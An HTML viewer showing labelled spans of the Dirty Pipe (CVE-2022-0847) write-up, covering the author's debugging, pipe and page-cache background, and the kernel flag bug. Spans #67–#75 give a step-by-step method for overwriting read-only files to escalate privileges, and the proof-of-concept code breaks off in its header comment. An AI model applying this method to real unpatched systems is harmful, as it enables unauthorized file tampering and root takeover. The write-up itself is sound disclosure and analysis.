@@ -1,0 +1,303 @@
+<title>CVE span labels</title>
+<style>
+:root{--bg:#fbfaf7;--fg:#171613;--muted:#76746c;--line:#e3e1d8;--head:#f1efe7;--card:#fff;--acc:#1f6fb2}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#141412;--fg:#ecebe5;--muted:#9b998f;--line:#312f2a;--head:#1e1d1a;--card:#1a1917;--acc:#62a8e6}}
+body{font:14px/1.6 system-ui,-apple-system,"Segoe UI",sans-serif;background:var(--bg);color:var(--fg);max-width:1100px;margin:0 auto;padding:1.5rem 1.1rem 3rem}
+h1{font-size:1.35rem;margin:0 0 .3rem} h2{font-size:1.05rem;margin:1.8rem 0 .5rem}
+.note{color:var(--muted);font-size:.86rem;max-width:900px}
+.ctl{position:sticky;top:0;z-index:5;background:var(--bg);border-bottom:1px solid var(--line);padding:.5rem 0;display:flex;gap:.5rem 1rem;flex-wrap:wrap;align-items:center;font-size:.85rem}
+.legend b{font-weight:600;margin-right:.7rem;white-space:nowrap;cursor:pointer;opacity:.95}
+.legend b.off{opacity:.25;text-decoration:line-through} .sw{display:inline-block;width:11px;height:11px;border-radius:3px;vertical-align:middle;margin-right:3px}
+.span{border-left:4px solid var(--line);padding:.35rem .6rem;margin:.28rem 0;border-radius:0 6px 6px 0;background:var(--card)}
+.span .lab{font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);font-weight:700}
+.span .idx{color:var(--muted);font-size:.7rem;float:right}
+.span pre{margin:.3rem 0 0;white-space:pre-wrap;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--muted);max-height:16em;overflow:auto}
+.span p{margin:.15rem 0 0} .span.code{background:transparent} .hide{display:none}
+table{border-collapse:collapse;margin:.4rem 0} th,td{border-bottom:1px solid var(--line);padding:4px 10px;text-align:left;font-size:.85rem}
+th{background:var(--head);color:var(--muted);font-weight:600} td.n{text-align:right;font-variant-numeric:tabular-nums}
+</style>
+<h1>CVE write-up span labels</h1>
+<div class=note>Each span is one paragraph, heading or fenced code block. The <b>label</b> says what the span is about; <b>code</b> is a surface flag, so a listing that demonstrates an exploit is <i>exploit</i> + code. Click a legend entry to hide that label.</div>
+<div class=ctl><span class="legend"><b data-lab="uaf"><span class=sw style="background:#b5179e"></span>uaf</b> <b data-lab="heap_overflow"><span class=sw style="background:#d9730d"></span>heap_overflow</b> <b data-lab="stack_overflow"><span class=sw style="background:#c2410c"></span>stack_overflow</b> <b data-lab="integer_overflow"><span class=sw style="background:#a16207"></span>integer_overflow</b> <b data-lab="race_condition"><span class=sw style="background:#7a7500"></span>race_condition</b> <b data-lab="oob_access"><span class=sw style="background:#be123c"></span>oob_access</b> <b data-lab="command_injection"><span class=sw style="background:#2a6fdb"></span>command_injection</b> <b data-lab="path_traversal"><span class=sw style="background:#0e7490"></span>path_traversal</b> <b data-lab="auth_bypass"><span class=sw style="background:#6a3fb5"></span>auth_bypass</b> <b data-lab="priv_esc"><span class=sw style="background:#9d174d"></span>priv_esc</b> <b data-lab="uninit_memory"><span class=sw style="background:#12897f"></span>uninit_memory</b> <b data-lab="other_vuln"><span class=sw style="background:#57534e"></span>other_vuln</b> <b data-lab="background"><span class=sw style="background:#78716c"></span>background</b> <b data-lab="debugging"><span class=sw style="background:#94a3b8"></span>debugging</b> <b data-lab="exploit"><span class=sw style="background:#dc2626"></span>exploit</b> <b data-lab="patch"><span class=sw style="background:#15803d"></span>patch</b> <b data-lab="benign"><span class=sw style="background:#16a34a"></span>benign</b></span><label><input type=checkbox id=hidecode> hide code spans</label></div>
+<h2>dirtypipe <span class=note>(78 spans)</span></h2>
+<table><tr><th>label</th><th>spans</th><th>chars</th></tr><tr><td><span class=sw style='background:#94a3b8'></span>debugging</td><td class=n>39</td><td class=n>6894</td></tr><tr><td><span class=sw style='background:#78716c'></span>background</td><td class=n>17</td><td class=n>5498</td></tr><tr><td><span class=sw style='background:#dc2626'></span>exploit</td><td class=n>9</td><td class=n>6266</td></tr><tr><td><span class=sw style='background:#12897f'></span>uninit_memory</td><td class=n>8</td><td class=n>2250</td></tr><tr><td><span class=sw style='background:#15803d'></span>patch</td><td class=n>3</td><td class=n>780</td></tr><tr><td><span class=sw style='background:#9d174d'></span>priv_esc</td><td class=n>1</td><td class=n>244</td></tr><tr><td><span class=sw style='background:#16a34a'></span>benign</td><td class=n>1</td><td class=n>376</td></tr></table>
+<div class="span heading" data-lab="background" style="border-left-color:#78716c"><span class=idx>#0 · heading</span><span class=lab style="color:#78716c">background</span><p><b># The Dirty Pipe Vulnerability - Complete Article Text</b></p></div>
+<div class="span heading" data-lab="background" style="border-left-color:#78716c"><span class=idx>#1 · heading</span><span class=lab style="color:#78716c">background</span><p><b>## The Dirty Pipe Vulnerability</b></p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#2 · prose</span><span class=lab style="color:#78716c">background</span><p>Max Kellermann &lt;max.kellermann@ionos.com&gt;</p></div>
+<div class="span heading" data-lab="background" style="border-left-color:#78716c"><span class=idx>#3 · heading</span><span class=lab style="color:#78716c">background</span><p><b>### Abstract</b></p></div>
+<div class="span prose" data-lab="priv_esc" style="border-left-color:#9d174d"><span class=idx>#4 · prose</span><span class=lab style="color:#9d174d">priv_esc</span><p>This is the story of CVE-2022-0847, a vulnerability in the Linux kernel since 5.8 which allows overwriting data in arbitrary read-only files. This leads to privilege escalation because unprivileged processes can inject code into root processes.</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#5 · prose</span><span class=lab style="color:#78716c">background</span><p>It is similar to CVE-2016-5195 &quot;Dirty Cow&quot; but is easier to exploit.</p></div>
+<div class="span prose" data-lab="patch" style="border-left-color:#15803d"><span class=idx>#6 · prose</span><span class=lab style="color:#15803d">patch</span><p>The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.</p></div>
+<div class="span heading" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#7 · heading</span><span class=lab style="color:#94a3b8">debugging</span><p><b>### Corruption pt. I</b></p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#8 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>It all started a year ago with a support ticket about corrupt files. A customer complained that the access logs they downloaded could not be decompressed. And indeed, there was a corrupt log file on one of the log servers; it could be decompressed, but `gzip` reported a CRC error. I could not explain why it was corrupt, but I assumed the nightly split process had crashed and left a corrupt file behind. I fixed the file&#x27;s CRC manually, closed the ticket, and soon forgot about the problem.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#9 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>Months later, this happened again and yet again. Every time, the file&#x27;s contents looked correct, only the CRC at the end of the file was wrong. Now, with several corrupt files, I was able to dig deeper and found a surprising kind of corruption. A pattern emerged.</p></div>
+<div class="span heading" data-lab="background" style="border-left-color:#78716c"><span class=idx>#10 · heading</span><span class=lab style="color:#78716c">background</span><p><b>### Access Logging</b></p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#11 · prose</span><span class=lab style="color:#78716c">background</span><p>Let me briefly introduce how our log server works: In the CM4all hosting environment, all web servers (running our custom open source HTTP server) send UDP multicast datagrams with metadata about each HTTP request. These are received by the log servers running Pond, our custom open source in-memory database. A nightly job splits all access logs of the previous day into one per hosted web site, each compressed with zlib.</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#12 · prose</span><span class=lab style="color:#78716c">background</span><p>Via HTTP, all access logs of a month can be downloaded as a single `.gz` file. Using a trick (which involves `Z_SYNC_FLUSH`), we can just concatenate all gzipped daily log files without having to decompress and recompress them, which means this HTTP request consumes nearly no CPU. Memory bandwidth is saved by employing the `splice()` system call to feed data directly from the hard disk into the HTTP connection, without passing the kernel/userspace boundary (&quot;zero-copy&quot;).</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#13 · prose</span><span class=lab style="color:#78716c">background</span><p>Windows users can&#x27;t handle `.gz` files, but everybody can extract ZIP files. A ZIP file is just a container for `.gz` files, so we could use the same method to generate ZIP files on-the-fly; all we needed to do was send a ZIP header first, then concatenate all `.gz` file contents as usual, followed by the central directory (another kind of header).</p></div>
+<div class="span heading" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#14 · heading</span><span class=lab style="color:#94a3b8">debugging</span><p><b>### Corruption pt. II</b></p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#15 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>This is how a the end of a proper daily file looks:</p></div>
+<div class="span code" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#16 · code</span><span class=lab style="color:#94a3b8">debugging</span><pre>```
+000005f0  81 d6 94 39 8a 05 b0 ed  e9 c0 fd 07 00 00 ff ff
+00000600  03 00 9c 12 0b f5 f7 4a  00 00
+```</pre></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#17 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>The `00 00 ff ff` is the sync flush which allows simple concatenation. `03 00` is an empty &quot;final&quot; block, and is followed by a CRC32 (`0xf50b129c`) and the uncompressed file length (`0x00004af7` = 19191 bytes).</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#18 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>The same file but corrupted:</p></div>
+<div class="span code" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#19 · code</span><span class=lab style="color:#94a3b8">debugging</span><pre>```
+000005f0  81 d6 94 39 8a 05 b0 ed  e9 c0 fd 07 00 00 ff ff
+00000600  03 00 50 4b 01 02 1e 03  14 00
+```</pre></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#20 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>The sync flush is there, the empty final block is there, but the uncompressed length is now `0x0014031e` = 1.3 MB (that&#x27;s wrong, it&#x27;s the same 19 kB file as above). The CRC32 is `0x02014b50`, which does not match the file contents. Why? Is this an out-of-bounds write or a heap corruption bug in our log client?</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#21 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>I compared all known-corrupt files and discovered, to my surprise, that all of them had the same CRC32 and the same &quot;file length&quot; value. Always the same CRC - this implies that this cannot be the result of a CRC calculation. With corrupt data, we would see different (but wrong) CRC values. For hours, I stared holes into the code but could not find an explanation.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#22 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>Then I stared at these 8 bytes. Eventually, I realized that `50 4b` is ASCII for &quot;P&quot; and &quot;K&quot;. &quot;PK&quot;, that&#x27;s how all ZIP headers start. Let&#x27;s have a look at these 8 bytes again:</p></div>
+<div class="span code" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#23 · code</span><span class=lab style="color:#94a3b8">debugging</span><pre>```
+50 4b 01 02 1e 03 14 00
+```</pre></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#24 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>* `50 4b` is &quot;PK&quot;
+* `01 02` is the code for central directory file header
+* &quot;Version made by&quot; = `1e 03`; `0x1e` = 30 (3.0); `0x03` = UNIX
+* &quot;Version needed to extract&quot; = `14 00`; `0x0014` = 20 (2.0)</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#25 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>The rest is missing; the header was apparently truncated after 8 bytes.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#26 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>This is really the beginning of a ZIP central directory file header, this cannot be a coincidence. But the process which writes these files has no code to generate such header. In my desperation, I looked at the zlib source code and all other libraries used by that process but found nothing. This piece of software doesn&#x27;t know anything about &quot;PK&quot; headers.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#27 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>There is one process which generates &quot;PK&quot; headers, though; it&#x27;s the web service which constructs ZIP files on-the-fly. But this process runs as a different user which doesn&#x27;t have write permissions on these files. It cannot possibly be that process.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#28 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>None of this made sense, but new support tickets kept coming in (at a very slow rate). There was some systematic problem, but I just couldn&#x27;t get a grip on it. That gave me a lot of frustration, but I was busy with other tasks, and I kept pushing this file corruption problem to the back of my queue.</p></div>
+<div class="span heading" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#29 · heading</span><span class=lab style="color:#94a3b8">debugging</span><p><b>### Corruption pt. III</b></p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#30 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>External pressure brought this problem back into my consciousness. I scanned the whole hard disk for corrupt files (which took two days), hoping for more patterns to emerge. And indeed, there was a pattern:</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#31 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>* there were 37 corrupt files within the past 3 months
+* they occurred on 22 unique days
+* 18 of those days have 1 corruption
+* 1 day has 2 corruptions (2021-11-21)
+* 1 day has 7 corruptions (2021-11-30)
+* 1 day has 6 corruptions (2021-12-31)
+* 1 day has 4 corruptions (2022-01-31)</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#32 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>The last day of each month is clearly the one which most corruptions occur.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#33 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>Only the primary log server had corruptions (the one which served HTTP connections and constructed ZIP files). The standby server (HTTP inactive but same log extraction process) had zero corruptions. Data on both servers was identical, minus those corruptions.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#34 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>Is this caused by flaky hardware? Bad RAM? Bad storage? Cosmic rays? No, the symptoms don&#x27;t look like a hardware issue. A ghost in the machine? Do we need an exorcist?</p></div>
+<div class="span heading" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#35 · heading</span><span class=lab style="color:#94a3b8">debugging</span><p><b>### Man staring at code</b></p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#36 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>I began staring holes into my code again, this time the web service.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#37 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>Remember, the web service writes a ZIP header, then uses `splice()` to send all compressed files, and finally uses `write()` again for the &quot;central directory file header&quot;, which begins with `50 4b 01 02 1e 03 14 00`, exactly the corruption. The data sent over the wire looks exactly like the corrupt files on disk. But the process sending this on the wire has no write permissions on those files (and doesn&#x27;t even try to do so), it only reads them. Against all odds and against the impossible, it **must** be that process which causes corruptions, but how?</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#38 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>My first flash of inspiration why it&#x27;s always the last day of the month which gets corrupted. When a website owner downloads the access log, the server starts with the first day of the month, then the second day, and so on. Of course, the last day of the month is sent at the end; the last day of the month is always followed by the &quot;PK&quot; header. That&#x27;s why it&#x27;s more likely to corrupt the last day. (The other days can be corrupted if the requested month is not yet over, but that&#x27;s less likely.)</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#39 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>How?</p></div>
+<div class="span heading" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#40 · heading</span><span class=lab style="color:#94a3b8">debugging</span><p><b>### Man staring at kernel code</b></p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#41 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>After being stuck for more hours, after eliminating everything that was definitely impossible (in my opinion), I drew a conclusion: this must be a kernel bug.</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#42 · prose</span><span class=lab style="color:#78716c">background</span><p>Blaming the Linux kernel (i.e. somebody else&#x27;s code) for data corruption must be the last resort. That is unlikely. The kernel is an extremely complex project developed by thousands of individuals with methods that may seem chaotic; despite of this, it is extremely stable and reliable. But this time, I was convinced that it must be a kernel bug.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#43 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>In a moment of extraordinary clarity, I hacked two C programs.</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#44 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>One that keeps writing odd chunks of the string &quot;AAAAA&quot; to a file (simulating the log splitter):</p></div>
+<div class="span code" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#45 · code</span><span class=lab style="color:#94a3b8">debugging</span><pre>```c
+#include &lt;unistd.h&gt;
+int main(int argc, char **argv) {
+  for (;;) write(1, &quot;AAAAA&quot;, 5);
+}
+// ./writer &gt;foo
+```</pre></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#46 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>And one that keeps transferring data from that file to a pipe using `splice()` and then writes the string &quot;BBBBB&quot; to the pipe (simulating the ZIP generator):</p></div>
+<div class="span code" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#47 · code</span><span class=lab style="color:#94a3b8">debugging</span><pre>```c
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+int main(int argc, char **argv) {
+  for (;;) {
+    splice(0, 0, 1, 0, 2, 0);
+    write(1, &quot;BBBBB&quot;, 5);
+  }
+}
+// ./splicer &lt;foo |cat &gt;/dev/null
+```</pre></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#48 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>I copied those two programs to the log server, and… **bingo**! The string &quot;BBBBB&quot; started appearing in the file, even though nobody ever wrote this string to the file (only to the pipe by a process without write permissions).</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#49 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>So this really is a kernel bug!</p></div>
+<div class="span prose" data-lab="debugging" style="border-left-color:#94a3b8"><span class=idx>#50 · prose</span><span class=lab style="color:#94a3b8">debugging</span><p>All bugs become shallow once they can be reproduced. A quick check verified that this bug affects Linux 5.10 (Debian Bullseye) but not Linux 4.19 (Debian Buster). There are 185.011 git commits between v4.19 and v5.10, but thanks to `git bisect`, it takes just 17 steps to locate the faulty commit.</p></div>
+<div class="span prose" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#51 · prose</span><span class=lab style="color:#12897f">uninit_memory</span><p>The bisect arrived at commit f6dd975583bd, which refactors the pipe buffer code for anonymous pipe buffers. It changes the way how the &quot;mergeable&quot; check is done for pipes.</p></div>
+<div class="span heading" data-lab="background" style="border-left-color:#78716c"><span class=idx>#52 · heading</span><span class=lab style="color:#78716c">background</span><p><b>### Pipes and Buffers and Pages</b></p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#53 · prose</span><span class=lab style="color:#78716c">background</span><p>Why pipes, anyway? In our setup, the web service which generates ZIP files communicates with the web server over pipes; it talks the Web Application Socket protocol which we invented because we were not happy with CGI, FastCGI and AJP. Using pipes instead of multiplexing over a socket (like FastCGI and AJP do) has a major advantage: you can use `splice()` in both the application and the web server for maximum efficiency. This reduces the overhead for having web applications out-of-process (as opposed to running web services inside the web server process, like Apache modules do). This allows privilege separation without sacrificing (much) performance.</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#54 · prose</span><span class=lab style="color:#78716c">background</span><p>Short detour on Linux memory management: The smallest unit of memory managed by the CPU is a **page** (usually 4 kB). Everything in the lowest layer of Linux&#x27;s memory management is about pages. If an application requests memory from the kernel, it will get a number of (anonymous) pages. All file I/O is also about pages: if you read data from a file, the kernel first copies a number of 4 kB chunks from the hard disk into kernel memory, managed by a subsystem called the **page cache**. From there, the data will be copied to userspace. The copy in the page cache remains for some time, where it can be used again, avoiding unnecessary hard disk I/O, until the kernel decides it has a better use for that memory (&quot;reclaim&quot;). Instead of copying file data to userspace memory, pages managed by the page cache can be mapped directly into userspace using the `mmap()` system call (a trade-off for reduced memory bandwidth at the cost of increased page faults and TLB flushes). The Linux kernel has more tricks: the `sendfile()` system call allows an application to send file contents into a socket without a roundtrip to userspace (an optimization popular in web servers serving static files over HTTP). The `splice()` system call is kind of a generalization of `sendfile()`: It allows the same optimization if either side of the transfer is a **pipe**; the other side can be almost anything (another pipe, a file, a socket, a block device, a character device). The kernel implements this by passing **page** references around, not actually copying anything (zero-copy).</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#55 · prose</span><span class=lab style="color:#78716c">background</span><p>A **pipe** is a tool for unidirectional inter-process communication. One end is for pushing data into it, the other end can pull that data. The Linux kernel implements this by a ring of `struct pipe_buffer`, each referring to a **page**. The first write to a pipe allocates a page (space for 4 kB worth of data). If the most recent write does not fill the page completely, a following write may append to that existing page instead of allocating a new one. This is how &quot;anonymous&quot; pipe buffers work (`anon_pipe_buf_ops`).</p></div>
+<div class="span prose" data-lab="benign" style="border-left-color:#16a34a"><span class=idx>#56 · prose</span><span class=lab style="color:#16a34a">benign</span><p>If you, however, `splice()` data from a file into the pipe, the kernel will first load the data into the **page cache**. Then it will create a `struct pipe_buffer` pointing inside the page cache (zero-copy), but unlike anonymous pipe buffers, additional data written to the pipe must not be appended to such a page because the page is owned by the page cache, not by the pipe.</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#57 · prose</span><span class=lab style="color:#78716c">background</span><p>History of the check for whether new data can be appended to an existing pipe buffer:</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#58 · prose</span><span class=lab style="color:#78716c">background</span><p>* Long ago, `struct pipe_buf_operations` had a flag called `can_merge`.
+* Commit 5274f052e7b3 &quot;Introduce sys_splice() system call&quot; (Linux 2.6.16, 2006) featured the `splice()` system call, introducing `page_cache_pipe_buf_ops`, a `struct pipe_buf_operations` implementation for pipe buffers pointing into the page cache, the first one with `can_merge=0` (not mergeable).
+* Commit 01e7187b4119 &quot;pipe: stop using -&gt;can_merge&quot; (Linux 5.0, 2019) converted the `can_merge` flag into a `struct pipe_buf_operations` pointer comparison because only `anon_pipe_buf_ops` has this flag set.
+* Commit f6dd975583bd &quot;pipe: merge anon_pipe_buf*_ops&quot; (Linux 5.8, 2020) converted this pointer comparison to per-buffer flag `PIPE_BUF_FLAG_CAN_MERGE`.</p></div>
+<div class="span prose" data-lab="background" style="border-left-color:#78716c"><span class=idx>#59 · prose</span><span class=lab style="color:#78716c">background</span><p>Over the years, this check was refactored back and forth, which was okay. Or was it?</p></div>
+<div class="span heading" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#60 · heading</span><span class=lab style="color:#12897f">uninit_memory</span><p><b>### Uninitialized</b></p></div>
+<div class="span prose" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#61 · prose</span><span class=lab style="color:#12897f">uninit_memory</span><p>Several years before `PIPE_BUF_FLAG_CAN_MERGE` was born, commit 241699cd72a8 &quot;new iov_iter flavour: pipe-backed&quot; (Linux 4.9, 2016) added two new functions which allocate a new `struct pipe_buffer`, but initialization of its `flags` member was missing. It was now possible to create page cache references with arbitrary flags, but that did not matter. It was technically a bug, though without consequences at that time because all of the existing flags were rather boring.</p></div>
+<div class="span prose" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#62 · prose</span><span class=lab style="color:#12897f">uninit_memory</span><p>This bug suddenly became critical in Linux 5.8 with commit f6dd975583bd &quot;pipe: merge anon_pipe_buf*_ops&quot;. By injecting `PIPE_BUF_FLAG_CAN_MERGE` into a page cache reference, it became possible to overwrite data in the page cache, simply by writing new data into the pipe prepared in a special way.</p></div>
+<div class="span heading" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#63 · heading</span><span class=lab style="color:#12897f">uninit_memory</span><p><b>### Corruption pt. IV</b></p></div>
+<div class="span prose" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#64 · prose</span><span class=lab style="color:#12897f">uninit_memory</span><p>This explains the file corruption: First, some data gets written into the pipe, then lots of files get spliced, creating page cache references. Randomly, those may or may not have `PIPE_BUF_FLAG_CAN_MERGE` set. If yes, then the `write()` call that writes the central directory file header will be written to the page cache of the last compressed file.</p></div>
+<div class="span prose" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#65 · prose</span><span class=lab style="color:#12897f">uninit_memory</span><p>But why only the first 8 bytes of that header? Actually, all of the header gets copied to the page cache, but this operation does not increase the file size. The original file had only 8 bytes of &quot;unspliced&quot; space at the end, and only those bytes can be overwritten. The rest of the page is unused from the page cache&#x27;s perspective (though the pipe buffer code does use it because it has its own page fill management).</p></div>
+<div class="span prose" data-lab="uninit_memory" style="border-left-color:#12897f"><span class=idx>#66 · prose</span><span class=lab style="color:#12897f">uninit_memory</span><p>And why does this not happen more often? Because the page cache does not write back to disk unless it believes the page is &quot;dirty&quot;. Accidently overwriting data in the page cache will not make the page &quot;dirty&quot;. If no other process happens to &quot;dirty&quot; the file, this change will be ephemeral; after the next reboot (or after the kernel decides to drop the page from the cache, e.g. reclaim under memory pressure), the change is reverted. This allows interesting attacks without leaving a trace on hard disk.</p></div>
+<div class="span heading" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#67 · heading</span><span class=lab style="color:#dc2626">exploit</span><p><b>### Exploiting</b></p></div>
+<div class="span prose" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#68 · prose</span><span class=lab style="color:#dc2626">exploit</span><p>In my first exploit (the &quot;writer&quot; / &quot;splicer&quot; programs which I used for the bisect), I had assumed that this bug is only exploitable while a privileged process writes the file, and that it depends on timing.</p></div>
+<div class="span prose" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#69 · prose</span><span class=lab style="color:#dc2626">exploit</span><p>When I realized what the real problem was, I was able to widen the hole by a large margin: it is possible to overwrite the page cache even in the absence of writers, with no timing constraints, at (almost) arbitrary positions with arbitrary data. The limitations are:</p></div>
+<div class="span prose" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#70 · prose</span><span class=lab style="color:#dc2626">exploit</span><p>* the attacker must have read permissions (because it needs to `splice()` a page into a pipe)
+* the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)
+* the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)
+* the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)</p></div>
+<div class="span prose" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#71 · prose</span><span class=lab style="color:#dc2626">exploit</span><p>To exploit this vulnerability, you need to:</p></div>
+<div class="span prose" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#72 · prose</span><span class=lab style="color:#dc2626">exploit</span><p>1. Create a pipe.
+2. Fill the pipe with arbitrary data (to set the `PIPE_BUF_FLAG_CAN_MERGE` flag in all ring entries).
+3. Drain the pipe (leaving the flag set in all `struct pipe_buffer` instances on the `struct pipe_inode_info` ring).
+4. Splice data from the target file (opened with `O_RDONLY`) into the pipe from just before the target offset.
+5. Write arbitrary data into the pipe; this data will overwrite the cached file page instead of creating a new anomyous `struct pipe_buffer` because `PIPE_BUF_FLAG_CAN_MERGE` is set.</p></div>
+<div class="span prose" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#73 · prose</span><span class=lab style="color:#dc2626">exploit</span><p>To make this vulnerability more interesting, it not only works without write permissions, it also works with immutable files, on read-only btrfs snapshots and on read-only mounts (including CD-ROM mounts). That is because the page cache is always writable (by the kernel), and writing to a pipe never checks any permissions.</p></div>
+<div class="span prose" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#74 · prose</span><span class=lab style="color:#dc2626">exploit</span><p>This is the proof-of-concept exploit:</p></div>
+<div class="span code" data-lab="exploit" style="border-left-color:#dc2626"><span class=idx>#75 · code</span><span class=lab style="color:#dc2626">exploit</span><pre>```c
+/* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd (&quot;pipe: merge
+ * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
